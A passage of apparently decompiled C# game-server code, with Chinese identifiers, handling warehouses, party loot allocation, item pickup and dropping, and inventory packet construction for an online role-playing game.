							仓库包物品操作(38144, 仓库类型, 物品ID, 个人仓库[仓库位置].Get物品数量, 个人仓库[仓库位置], 仓库位置, 0);
						}
						else
						{
							公共仓库[仓库位置].物品_byte = array2;
							仓库包物品操作(38144, 仓库类型, 物品ID, 公共仓库[仓库位置].Get物品数量, 公共仓库[仓库位置], 仓库位置, 0);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "仓库_装备栏减物品  出错  [" + base.Userid + "][" + base.UserName + "]位置[" + 位置 + "]数量[" + 数量 + "]仓库位置[" + 仓库位置 + "]仓库类型[" + 仓库类型 + "]  " + ex.Message);
			}
			更新金钱和负重();
		}

		public void 打开个人仓库()
		{
			try
			{
				发包类 发包类 = new 发包类();
				发包类.Write4(5);
				发包类.Write4(5);
				发包类.Write4(8);
				for (int i = 0; i < 60; i++)
				{
					if (Buffer.ToInt32(个人仓库[i].物品数量, 0) == 0)
					{
						个人仓库[i].物品_byte = new byte[World.数据库单个物品大小];
					}
					else
					{
						检查物品系统("个人仓库", ref 个人仓库[i]);
					}
					if (个人仓库[i].FLD_FJ_中级附魂 <= 22 && 个人仓库[i].FLD_FJ_中级附魂 >= 21 && 个人仓库[i].FLD_FJ_觉醒 > 0)
					{
						个人仓库[i].物品_中级附魂_追加_觉醒 = 个人仓库[i].FLD_FJ_中级附魂 - 20;
					}
					发包类.Write(个人仓库[i].GetByte(), 0, World.发包单个物品大小);
				}
				发包类.Write8(base.个人仓库钱数);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 38400, base.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "打开个人仓库出错      [" + base.Userid + "][" + base.UserName + "]      " + ex.Message);
			}
		}

		public void 打开综合仓库()
		{
			try
			{
				发包类 发包类 = new 发包类();
				发包类.Write4(5);
				发包类.Write4(5);
				发包类.Write4(9);
				for (int i = 0; i < 60; i++)
				{
					if (Buffer.ToInt32(公共仓库[i].物品数量, 0) == 0)
					{
						公共仓库[i].物品_byte = new byte[World.数据库单个物品大小];
					}
					else
					{
						检查物品系统("公共仓库", ref 公共仓库[i]);
					}
					if (公共仓库[i].FLD_FJ_中级附魂 <= 22 && 公共仓库[i].FLD_FJ_中级附魂 >= 21 && 公共仓库[i].FLD_FJ_觉醒 > 0)
					{
						公共仓库[i].物品_中级附魂_追加_觉醒 = 公共仓库[i].FLD_FJ_中级附魂 - 20;
					}
					发包类.Write(公共仓库[i].GetByte(), 0, World.发包单个物品大小);
				}
				发包类.Write8(base.综合仓库钱数);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 38400, base.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "打开综合仓库出错      [" + base.Userid + "][" + base.UserName + "]      " + ex.Message);
			}
		}

		public Players 组队分配(Players play)
		{
			int i = 0;
			try
			{
				组队Class value;
				if (!World.W组队.TryGetValue(play.组队id, out value))
				{
					return play;
				}
				if (value.道具分配规则 != 1)
				{
					for (; i < value.队员列表.Count; i++)
					{
						int key = RNG.Next(0, value.队员列表.Count - 1);
						Players players = value.得到对应队员(key);
						if (players != null && play.查找范围玩家(1000, players))
						{
							return players;
						}
					}
					return play;
				}
				for (; i < value.队员列表.Count; i++)
				{
					if (value.当前分配 >= value.队员列表.Count)
					{
						value.当前分配 = 0;
					}
					Players players2 = value.得到对应队员(value.当前分配);
					value.当前分配++;
					if (players2 != null && play.查找范围玩家(1000, players2))
					{
						return players2;
					}
				}
				return play;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(100, "组队分配出错      [" + play.UserName + "]      循环次数[" + i + "]" + ((ex != null) ? ex.ToString() : null));
				return null;
			}
		}

		public void 捡物品(byte[] data, int length)
		{
			封包修改(data, length);
			long num = BitConverter.ToInt64(data, 10);
			if (base.人物_HP > 0 && !base.Player死亡 && !退出中 && !交易.交易中 && !打开仓库中 && !进店中)
			{
				int num2 = 0;
				while (true)
				{
					if (num2 < 66)
					{
						long num3 = BitConverter.ToInt64(装备栏包裹[num2].物品全局ID, 0);
						if (num3 != 0L && num3 == num)
						{
							break;
						}
						num2++;
						continue;
					}
					try
					{
						using (new Lock(World.locklist2, "拾取"))
						{
							地面物品类 itme = 地面物品类.GetItme(num);
							Players players;
							if (itme != null)
							{
								bool flag = false;
								players = this;
								if (itme.物品优先权 == null || itme.物品优先权 == this)
								{
									goto IL_0151;
								}
								if (组队id != 0)
								{
									组队Class value;
									if (World.W组队.TryGetValue(组队id, out value))
									{
										foreach (Players value4 in value.队员列表.Values)
										{
											if (value4 == itme.物品优先权)
											{
												flag = true;
											}
										}
										if (flag)
										{
											goto IL_0151;
										}
										捡物品提示(5, num);
									}
									else
									{
										捡物品提示(5, num);
									}
								}
								else
								{
									捡物品提示(5, num);
								}
							}
							else
							{
								捡物品提示(5, num);
							}
							goto end_IL_009c;
							IL_0173:
							if (itme.物品.物品总重量 + players.人物当前负重 >= players.人物负重总)
							{
								players.捡物品提示(2, num);
							}
							else
							{
								int num4 = 得到包裹空位(players);
								if (num4 != -1)
								{
									ItmeClass value2;
									if (World.Itme.TryGetValue(BitConverter.ToInt32(itme.物品.物品ID, 0), out value2))
									{
										int fLD_SIDE = value2.FLD_SIDE;
										byte[] 物品数量 = itme.物品.物品数量;
										if (fLD_SIDE != 0)
										{
											物品类 物品类 = players.得到人物物品类型(BitConverter.ToInt32(itme.物品.物品ID, 0), itme.物品.FLD_MAGIC0);
											if (物品类 != null)
											{
												num4 = 物品类.物品位置;
												物品数量 = BitConverter.GetBytes(BitConverter.ToInt32(itme.物品.物品数量, 0) + BitConverter.ToInt32(物品类.物品数量, 0));
											}
										}
										if (World.ItmeTeM.ContainsKey(num))
										{
											World.ItmeTeM.Remove(num);
											players.捡得到物品(num4, 物品数量, itme.物品.物品全局ID, itme.物品.物品ID, itme.物品.物品属性, itme.物品来源);
											if (itme.物品来源 == 0)
											{
												RxjhClass.掉落记录(players.Userid, players.UserName, BitConverter.ToInt64(itme.物品.物品全局ID, 0), BitConverter.ToInt32(itme.物品.物品ID, 0), itme.物品.得到物品名称(), itme.物品.FLD_MAGIC0, itme.物品.FLD_MAGIC1, itme.物品.FLD_MAGIC2, itme.物品.FLD_MAGIC3, itme.物品.FLD_MAGIC4, players.人物坐标_地图, (int)players.人物坐标_X, (int)players.人物坐标_Y, "掉落");
												组队Class value3;
												if (组队id != 0 && World.W组队.TryGetValue(组队id, out value3))
												{
													foreach (Players value5 in value3.队员列表.Values)
													{
														if (value5.人物全服ID != players.人物全服ID)
														{
															value5.系统提示(players.UserName + "  获得" + value2.ItmeNAME, 22, "组队分配");
														}
													}
												}
											}
											itme.npcydtheout();
											players.更新金钱和负重();
											players.检查背包复制(players);
										}
									}
								}
								else
								{
									捡物品提示(7, num);
								}
							}
							goto end_IL_009c;
							IL_0151:
							if (组队id == 0)
							{
								goto IL_0173;
							}
							players = 组队分配(this);
							if (players != null)
							{
								goto IL_0173;
							}
							捡物品提示(5, num);
							end_IL_009c:;
						}
					}
					catch (Exception ex)
					{
						Form1.WriteLine(1, "捡物品出错  [" + base.Userid + "][" + base.UserName + "]  ID[" + num + "]  " + ex.Message);
					}
					return;
				}
				捡物品提示(5, num);
			}
			else
			{
				捡物品提示(5, num);
			}
		}

		public void 检查背包复制(Players play)
		{
			Dictionary<long, 物品类> dictionary = new Dictionary<long, 物品类>();
			for (int i = 0; i < 66; i++)
			{
				物品类 value;
				if (dictionary.TryGetValue(BitConverter.ToInt64(play.装备栏包裹[i].物品全局ID, 0), out value))
				{
					play.减去物品(i, value.Get物品数量);
				}
				else
				{
					dictionary.Add(BitConverter.ToInt64(play.装备栏包裹[i].物品全局ID, 0), play.装备栏包裹[i]);
				}
			}
			dictionary.Clear();
		}

		public void 扔物品(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				if (base.人物_HP <= 0 || base.Player死亡 || 退出中 || 交易.交易中 || 打开仓库中 || 进店中)
				{
					return;
				}
				int num = 封包数据[35];
				int num2 = BitConverter.ToInt32(封包数据, 18);
				int num3 = BitConverter.ToInt32(封包数据, 26);
				ItmeClass value;
				if (num3 <= 0 || BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 0 || BitConverter.ToInt32(装备栏包裹[num].物品数量, 0) == 0 || num2 == 2000000000 || !World.Itme.TryGetValue(num2, out value) || value.FLD_QUESTITEM == 1)
				{
					return;
				}
				if (value.FLD_LOCK == 1)
				{
					系统提示("锁定的物品无法丢弃。");
					return;
				}
				if (装备栏包裹[num].物品绑定)
				{
					return;
				}
				byte[] array = new byte[World.数据库单个物品大小];
				byte[] array2 = new byte[8];
				System.Buffer.BlockCopy(装备栏包裹[num].物品_byte, 0, array, 0, World.数据库单个物品大小);
				System.Buffer.BlockCopy(array, 0, array2, 0, 8);
				if (装备栏包裹[num].物品类型 == 0)
				{
					扔捡物品提示(num, BitConverter.ToInt32(装备栏包裹[num].物品数量, 0));
					减去物品(num, BitConverter.ToInt32(装备栏包裹[num].物品数量, 0));
					System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 12, 4);
					地面物品类 地面物品类 = new 地面物品类(array, base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图, this, 1);
					地面物品类 value2;
					if (!World.ItmeTeM.TryGetValue(BitConverter.ToInt64(array2, 0), out value2))
					{
						World.ItmeTeM.Add(BitConverter.ToInt64(array2, 0), 地面物品类);
					}
					if (World.ItmeTeM.TryGetValue(BitConverter.ToInt64(array2, 0), out value2))
					{
						地面物品类.获取范围玩家发送地面增加物品数据包();
					}
				}
				else
				{
					if (BitConverter.ToInt32(装备栏包裹[num].物品数量, 0) <= num3)
					{
						num3 = BitConverter.ToInt32(装备栏包裹[num].物品数量, 0);
					}
					else
					{
						array2 = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						System.Buffer.BlockCopy(array2, 0, array, 0, 8);
					}
					try
					{
						扔捡物品提示(num, num3);
						减去物品(num, num3);
						System.Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array, 12, 4);
						地面物品类 地面物品类2 = new 地面物品类(array, base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图, this, 1);
						地面物品类 value3;
						if (!World.ItmeTeM.TryGetValue(BitConverter.ToInt64(array2, 0), out value3))
						{
							World.ItmeTeM.Add(BitConverter.ToInt64(array2, 0), 地面物品类2);
						}
						if (World.ItmeTeM.TryGetValue(BitConverter.ToInt64(array2, 0), out value3))
						{
							地面物品类2.获取范围玩家发送地面增加物品数据包();
						}
					}
					catch (Exception ex)
					{
						Form1.WriteLine(1, "扔物品出错2  [" + base.Userid + "][" + base.UserName + "]  " + ex.Message);
					}
				}
			}
			catch (Exception ex2)
			{
				Form1.WriteLine(1, "扔物品出错3  [" + base.Userid + "][" + base.UserName + "]  " + ex2.Message);
			}
			更新金钱和负重();
		}

		public void 任务提示(int 任务ID, int 操作ID, int 任务阶段ID)
		{
			using (发包类 发包类 = new 发包类())
			{
				发包类.Write2(任务ID);
				发包类.Write2(操作ID);
				发包类.Write2(任务阶段ID);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 33792, base.人物全服ID);
				}
			}
		}

		public void 扔捡物品提示(int 位置, int 数量)
		{
			byte[] array = Converter.hexStringToByte("AA551E0000000F00100001000000010000001100000001000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 18, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 22, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 减去物品(int 位置, int 数量)
		{
			try
			{
				if (数量 >= 0)
				{
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write1(1);
						发包类.Write1(位置);
						发包类.Write2(0);
						发包类.Write(装备栏包裹[位置].Get物品ID);
						发包类.Write8(数量);
						发包类.Write8(0L);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 8704, base.人物全服ID);
						}
					}
					if (Buffer.ToInt32(装备栏包裹[位置].物品数量, 0) <= 数量)
					{
						装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
					}
					else
					{
						byte[] bytes = Buffer.GetBytes(Buffer.ToInt32(装备栏包裹[位置].物品数量, 0) - 数量);
						int fLD_MAGIC = 装备栏包裹[位置].FLD_MAGIC0;
						装备栏包裹[位置].物品数量 = Buffer.GetBytes(0);
						ItmeClass value;
						if (World.Itme.TryGetValue(Buffer.ToInt32(装备栏包裹[位置].物品ID, 0), out value))
						{
							byte[] array = new byte[56];
							System.Buffer.BlockCopy(Buffer.GetBytes(fLD_MAGIC), 0, array, 0, 4);
							System.Buffer.BlockCopy(Buffer.GetBytes(value.FLD_MAGIC1), 0, array, 4, 4);
							System.Buffer.BlockCopy(Buffer.GetBytes(value.FLD_MAGIC2), 0, array, 8, 4);
							System.Buffer.BlockCopy(Buffer.GetBytes(value.FLD_MAGIC3), 0, array, 12, 4);
							System.Buffer.BlockCopy(Buffer.GetBytes(value.FLD_MAGIC4), 0, array, 16, 4);
							增加物品(装备栏包裹[位置].物品全局ID, 装备栏包裹[位置].物品ID, 装备栏包裹[位置].物品位置, bytes, array);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "减去物品      出错[" + base.Userid + "][" + base.UserName + "]      位置[" + 位置 + "]      数量[" + 数量 + "]      物品名称[" + 装备栏包裹[位置].得到物品名称() + "]装备栏包裹数量[" + Buffer.ToInt32(装备栏包裹[位置].物品数量, 0) + "]" + ex.Message);
			}
		}

		public void 物品减去属性数量(int 位置, int 减去数量)
		{
			try
			{
				if (减去数量 >= 0)
				{
					byte[] array = new byte[4];
					byte[] array2 = new byte[4];
					byte[] array3 = new byte[8];
					byte[] array4 = new byte[4];
					byte[] array5 = new byte[56];
					System.Buffer.BlockCopy(装备栏包裹[位置].物品_byte, 12, array2, 0, 4);
					System.Buffer.BlockCopy(装备栏包裹[位置].物品_byte, 16, array, 0, 4);
					System.Buffer.BlockCopy(装备栏包裹[位置].物品_byte, 8, array4, 0, 4);
					System.Buffer.BlockCopy(装备栏包裹[位置].物品_byte, 0, array3, 0, 8);
					int num = Buffer.ToInt32(array, 0) - 减去数量;
					if (num <= 2000000000)
					{
						减去物品(位置, 1);
					}
					else
					{
						减去物品(位置, Buffer.ToInt32(array2, 0));
						System.Buffer.BlockCopy(Buffer.GetBytes(num), 0, array5, 0, 4);
						增加物品(array3, array4, 位置, array2, array5);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "物品减去属性数量出错      [" + base.Userid + "][" + base.UserName + "]      位置[" + 位置 + "]      减去数量[" + 减去数量 + "]" + ex.Message);
			}
		}

		public void 增加物品(byte[] 物品全局ID, byte[] 物品ID, int 位置, byte[] 数量, byte[] 物品属性)
		{
			try
			{
				ItmeClass value;
				if (World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out value))
				{
					byte[] array = Converter.hexStringToByte("AA557200940223006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
					byte[] array2 = new byte[World.数据库单个物品大小];
					if (value.FLD_SIDE != 0)
					{
						byte[] array3 = new byte[4];
						System.Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
						物品类 物品类 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
						if (BitConverter.ToInt32(物品ID, 0) != 1008000044 && BitConverter.ToInt32(物品ID, 0) != 1008000045)
						{
							if (物品类 != null)
							{
								位置 = 物品类.物品位置;
								物品全局ID = 物品类.物品全局ID;
								数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类.物品数量, 0) + BitConverter.ToInt32(数量, 0));
							}
						}
						else
						{
							物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
							数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
						}
					}
					else
					{
						数量 = BitConverter.GetBytes(1);
					}
					System.Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
					System.Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
					System.Buffer.BlockCopy(数量, 0, array2, 12, 4);
					System.Buffer.BlockCopy(物品属性, 0, array2, 16, 55);
					System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 39, 2);
					System.Buffer.BlockCopy(array2, 0, array, 14, 12);
					System.Buffer.BlockCopy(array2, 12, array, 30, 4);
					System.Buffer.BlockCopy(array2, 16, array, 46, 55);
					装备栏包裹[位置].物品_byte = array2;
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "增加物品出错55  [" + base.Userid + "][" + base.UserName + "]  位置[" + 位置 + "]  数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public void 增加物品(byte[] 物品全局ID, byte[] 物品ID, int 位置, byte[] 数量, byte[] 物品属性, bool 绑定)
		{
			try
			{
				ItmeClass value;
				if (World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out value))
				{
					byte[] array = Converter.hexStringToByte("AA557200940223006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
					byte[] array2 = new byte[World.数据库单个物品大小];
					if (value.FLD_SIDE != 0)
					{
						byte[] array3 = new byte[4];
						System.Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
						物品类 物品类 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
						if (BitConverter.ToInt32(物品ID, 0) != 1008000044 && BitConverter.ToInt32(物品ID, 0) != 1008000045)
						{
							if (物品类 != null)
							{
								位置 = 物品类.物品位置;
								物品全局ID = 物品类.物品全局ID;
								数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类.物品数量, 0) + BitConverter.ToInt32(数量, 0));
							}
						}
						else
						{
							物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
							数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
						}
					}
					else
					{
						数量 = BitConverter.GetBytes(1);
					}
					System.Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
					System.Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
					System.Buffer.BlockCopy(数量, 0, array2, 12, 4);
					System.Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
					System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 39, 2);
					System.Buffer.BlockCopy(array2, 0, array, 14, 12);
					System.Buffer.BlockCopy(array2, 12, array, 30, 4);
					System.Buffer.BlockCopy(array2, 16, array, 46, 物品属性.Length);
					if (绑定)
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array2, 76, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(BitConverter.ToInt32(物品ID, 0) + 20000), 0, array, 22, 4);
					}
					else
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array2, 76, 1);
					}
					装备栏包裹[位置].物品_byte = array2;
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "增加物品出错1  [" + base.Userid + "][" + base.UserName + "]  位置[" + 位置 + "]  数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public void 增加物品4(byte[] 物品全局ID, byte[] 物品ID, int 位置, byte[] 数量, byte[] 物品属性)
		{
			try
			{
				ItmeClass value;
				if (World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out value))
				{
					byte[] array = Converter.hexStringToByte("AA55720088040D006C0001000000AD20A92C252D410645CD9A3B000000000100000000000000010B02140002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
					byte[] array2 = new byte[World.数据库单个物品大小];
					if (value.FLD_SIDE != 0)
					{
						byte[] array3 = new byte[4];
						System.Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
						物品类 物品类 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
						if (BitConverter.ToInt32(物品ID, 0) != 1008000044 && BitConverter.ToInt32(物品ID, 0) != 1008000045)
						{
							if (物品类 != null)
							{
								位置 = 物品类.物品位置;
								物品全局ID = 物品类.物品全局ID;
								数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类.物品数量, 0) + BitConverter.ToInt32(数量, 0));
							}
						}
						else
						{
							物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
							数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
						}
					}
					else
					{
						数量 = BitConverter.GetBytes(1);
					}
					System.Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
					System.Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
					System.Buffer.BlockCopy(数量, 0, array2, 12, 4);
					System.Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
					System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 39, 2);
					System.Buffer.BlockCopy(array2, 0, array, 14, 12);
					System.Buffer.BlockCopy(array2, 12, array, 30, 4);
					System.Buffer.BlockCopy(array2, 16, array, 43, 物品属性.Length);
					装备栏包裹[位置].物品_byte = array2;
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "增加物品出错2  [" + base.Userid + "][" + base.UserName + "]  位置[" + 位置 + "]  数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public void 增加物品2(byte[] 物品全局ID, byte[] 物品ID, int 位置, byte[] 数量, byte[] 物品属性)
		{
			try
			{
				ItmeClass value;
				if (World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out value))
				{
					byte[] array = Converter.hexStringToByte("AA55720094020D006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
					byte[] array2 = new byte[World.数据库单个物品大小];
					if (value.FLD_SIDE != 0)
					{
						byte[] array3 = new byte[4];
						System.Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
						物品类 物品类 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
						if (BitConverter.ToInt32(物品ID, 0) != 1008000044 && BitConverter.ToInt32(物品ID, 0) != 1008000045)
						{
							if (物品类 != null)
							{
								位置 = 物品类.物品位置;
								物品全局ID = 物品类.物品全局ID;
								数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类.物品数量, 0) + BitConverter.ToInt32(数量, 0));
							}
						}
						else
						{
							物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
							数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
						}
					}
					else
					{
						数量 = BitConverter.GetBytes(1);
					}
					System.Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
					System.Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
					System.Buffer.BlockCopy(数量, 0, array2, 12, 4);
					System.Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
					System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 39, 2);
					System.Buffer.BlockCopy(array2, 0, array, 14, 12);
					System.Buffer.BlockCopy(array2, 12, array, 30, 4);
					System.Buffer.BlockCopy(array2, 16, array, 43, 物品属性.Length);
					装备栏包裹[位置].物品_byte = array2;
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "增加物品出错2  [" + base.Userid + "][" + base.UserName + "]  位置[" + 位置 + "]  数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public int 天地灵符()
		{
			if (追加状态列表 != null)
			{
				if (GetAddState(1008001026))
				{
					return 1;
				}
				if (GetAddState(1008001027))
				{
					return 2;
				}
				if (GetAddState(1008001028))
				{
					return 3;
				}
				if (GetAddState(1008001029))
				{
					return 4;
				}
				if (GetAddState(1008001030))
				{
					return 5;
				}
				if (GetAddState(1008001031))
				{
					return 6;
				}
				if (GetAddState(1008001032))
				{
					return 7;
				}
				if (GetAddState(1008001033))
				{
					return 8;
				}
				if (GetAddState(1008001034))
				{
					return 9;
				}
				if (GetAddState(1008001035))
				{
					return 10;
				}
			}
			return 0;
		}

		public Dictionary<int, ItmeClass> 取职业物品(int RESIDE2, int job, int zx, int sex, int level)
		{
			Dictionary<int, ItmeClass> dictionary = new Dictionary<int, ItmeClass>();
			foreach (ItmeClass value in World.Itme.Values)
			{
				if (value.FLD_RESIDE2 == RESIDE2 && value.FLD_RESIDE1 == job && (value.FLD_SEX == sex || value.FLD_SEX == 0) && value.FLD_LEVEL == level && value.FLD_RECYCLE_MONEY != 0)
				{
					dictionary.Add(value.FLD_PID, value);
				}
			}
			return null;
		}

		public void 捡得到物品(int 位置, byte[] 物品数量, byte[] 物品全局ID, byte[] 物品ID, byte[] 物品属性, int TYPE)
		{
			ItmeClass value;
			if (BitConverter.ToInt32(物品数量, 0) <= 0 || !World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out value))
			{
				return;
			}
			if (value.FLD_QUESTITEM == 0)
			{
				if (TYPE == 0 && 天地灵符() != 0 && (value.FLD_RESIDE2 == 1 || value.FLD_RESIDE2 == 2 || value.FLD_RESIDE2 == 4 || value.FLD_RESIDE2 == 5))
				{
					Dictionary<int, ItmeClass> dictionary = 取职业物品(value.FLD_RESIDE2, 天地灵符(), base.Player_Zx, base.Player_Sex, value.FLD_LEVEL);
					if (dictionary != null)
					{
						int key = RNG.Next(0, dictionary.Count - 1);
						物品ID = BitConverter.GetBytes(dictionary[key].FLD_PID);
					}
				}
				byte[] array = Converter.hexStringToByte("AA55790047030D006B0001000000760849BF978FD0060608AF2F000000000200000000000000010C020F000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000998755AA");
				System.Buffer.BlockCopy(物品全局ID, 0, array, 14, 8);
				System.Buffer.BlockCopy(物品ID, 0, array, 22, 4);
				System.Buffer.BlockCopy(物品数量, 0, array, 30, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 39, 1);
				System.Buffer.BlockCopy(物品属性, 0, array, 46, 物品属性.Length);
				byte[] array2 = new byte[World.数据库单个物品大小];
				System.Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
				System.Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
				System.Buffer.BlockCopy(物品数量, 0, array2, 12, 4);
				System.Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
				装备栏包裹[位置].物品_byte = array2;
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array, array.Length);
				}
			}
			else
			{
				设置任务物品(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(物品数量, 0));
			}
		}

		public void 增加物品带属性(int 物品ID, int 位置, int 数量, int 物品属性0, int 物品属性1, int 物品属性2, int 物品属性3, int 物品属性4, int 初级附魂, int 中级附魂, int 进化, int 绑定, int 使用天数)
		{
			int num = 0;
			try
			{

				ItmeClass value;
				num = 1;
				if (World.Itme.TryGetValue(物品ID, out value))
				{
					byte[] array = new byte[56];
					num = 2;
					System.Buffer.BlockCopy(BitConverter.GetBytes(物品属性0), 0, array, 0, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(物品属性1), 0, array, 4, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(物品属性2), 0, array, 8, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(物品属性3), 0, array, 12, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(物品属性4), 0, array, 16, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(初级附魂), 0, array, 46, 4);
					if (中级附魂 > 0)
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 22, 2);
					}
					num = 3;
					System.Buffer.BlockCopy(BitConverter.GetBytes(中级附魂), 0, array, 24, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(进化), 0, array, 52, 4);
					long value2 = RxjhClass.GetDBItmeId();
					byte[] array2 = Converter.hexStringToByte("AA55720000000D00640001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
					byte[] array3 = new byte[World.数据库单个物品大小];
					if (value.FLD_SIDE != 0)
					{
						物品类 物品类 = 得到人物物品类型(物品ID, 物品属性0);
						if (物品ID != 1008000044 && 物品ID != 1008000045)
						{
							if (物品类 != null)
							{
								位置 = 物品类.物品位置;
								value2 = BitConverter.ToInt64(物品类.物品全局ID, 0);
								数量 = BitConverter.ToInt32(物品类.物品数量, 0) + 数量;
							}
						}
						else
						{
							value2 = RxjhClass.GetDBItmeId();
						}
					}
					else
					{
